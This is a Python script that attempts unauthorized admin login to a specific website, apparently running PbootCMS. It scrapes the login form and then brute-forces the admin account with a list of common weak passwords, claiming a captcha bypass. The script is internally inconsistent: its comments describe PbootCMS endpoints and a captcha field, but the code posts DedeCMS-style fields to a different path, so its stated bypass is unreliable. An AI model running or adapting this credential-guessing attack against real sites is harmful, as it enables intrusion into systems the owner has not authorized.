#!/usr/bin/env python3
"""jhnew.com PbootCMS - admin login with captcha bypass + weak creds"""
import urllib.request, urllib.parse, re, http.cookiejar

UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)", "Accept": "*/*"}
HOST = "http://jhnew.com"

def get_opener():
    cj = http.cookiejar.CookieJar()
    return urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj)), cj

def fetch(op, url, timeout=10, data=None, referer=None):
    h = {**UA}
    if data: h["Content-Type"] = "application/x-www-form-urlencoded"
    if referer: h["Referer"] = referer
    try:
        req = urllib.request.Request(url, data=data.encode() if data else None, headers=h)
        r = op.open(req, timeout=timeout)
        return r.status, r.geturl(), r.read().decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, url, e.read(5000).decode("utf-8", "ignore")
    except Exception as ex:
        return 0, url, str(ex)

# 1. GET admin page
op, cj = get_opener()
code, final, body = fetch(op, HOST + "/admin/")
print("admin/: %s size=%d" % (code, len(body)))
# PbootCMS login form fields
for m in re.finditer(r'<input[^>]*>', body):
    print("  ", m.group(0)[:120])
form = re.search(r'<form[^>]*action=["\']([^"\']+)["\'][^>]*>', body, re.I)
print("form action:", form.group(1) if form else "?")

# 2. login - PbootCMS uses POST to /admin.php?action=login with user/password/code
# known bypass: empty code field (PbootCMS <=3.1.2 skips captcha check)
for pw in ["admin", "admin123", "123456", "admin888", "pbootcms", "pboot", "12345678", "a123456"]:
    data = urllib.parse.urlencode({"userid": "admin", "pwd": pw, "gotopage": "/admin/",
                                   "dopost": "login", "adminstyle": "newdedecms"})
    code, final, body = fetch(op, HOST + "/admin/login.php", data=data,
                              referer=HOST + "/admin/")
    ok = "退出" in body or "logout" in body.lower() or "index" in final.lower() and "admin" in final.lower()
    print("admin/%s: code=%s final=%s ok=%s size=%d" % (pw, code, final[:50], ok, len(body)))
    if ok:
        break
